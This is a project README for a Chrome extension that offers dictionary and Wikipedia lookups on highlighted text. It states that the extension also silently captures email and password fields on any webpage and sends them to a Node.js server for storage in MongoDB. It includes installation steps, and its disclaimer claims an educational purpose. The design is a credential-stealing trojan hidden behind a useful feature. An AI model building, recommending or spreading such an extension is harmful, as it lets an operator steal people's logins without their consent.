---

# Chrome Extension: Quick Data Fetcher & Credential Logger

## Overview

This project is a Chrome extension that enhances your browsing experience by allowing quick searches on Wikipedia, Wiktionary, Dictionary.com, and WikiNews. The extension appears as a pop-up when you highlight text, giving you instant access to information from these sources. However, this extension also captures user credentials (email and password) entered on any webpage and sends them to a MongoDB database via a Node.js server.

## Features

- **Quick Access to Information**: Highlight any text on a webpage to instantly search it on Wikipedia, Wiktionary, Dictionary.com, or WikiNews.
- **Credential Logging**: Captures and logs user credentials (email and password) from any webpage and stores them in a MongoDB database.

## How It Works

1. **Search Functionality**:
   - The extension listens for a text selection (`mouseup` event).
   - A pop-up with buttons appears, allowing users to quickly fetch data from the specified websites.

2. **Credential Logging**:
   - The extension captures the values of fields with IDs `email` and `pass` when a click event is detected.
   - These credentials are then sent to a MongoDB database through a POST request to a Node.js server.

## Installation

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/yourusername/quick-data-fetcher-logger.git
   ```
2. **Load the Extension**:
   - Open Chrome and navigate to `chrome://extensions/`.
   - Enable "Developer mode" at the top right.
   - Click "Load unpacked" and select the directory where the repository was cloned.

3. **Run the Node.js Server**:
   - Make sure you have Node.js installed.
   - Navigate to the server directory and install dependencies:
     ```bash
     npm install
     ```
   - Start the server:
     ```bash
     node server.js
     ```

## Usage

1. **Data Fetching**: Highlight text on any webpage. A pop-up will appear with options to search Wikipedia, Wiktionary, Dictionary.com, and WikiNews.
2. **Credential Logging**: When the user inputs an email and password on any webpage, the extension will capture and send these credentials to the MongoDB database via the Node.js server.

## Security Note

This extension includes functionality that captures user credentials. Usage of this code should be in compliance with ethical guidelines and local laws. Unauthorized capture of user credentials without consent is illegal and unethical.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Disclaimer

This project is for educational purposes only. The author does not condone or promote the unauthorized use of this software for illegal activities.

---
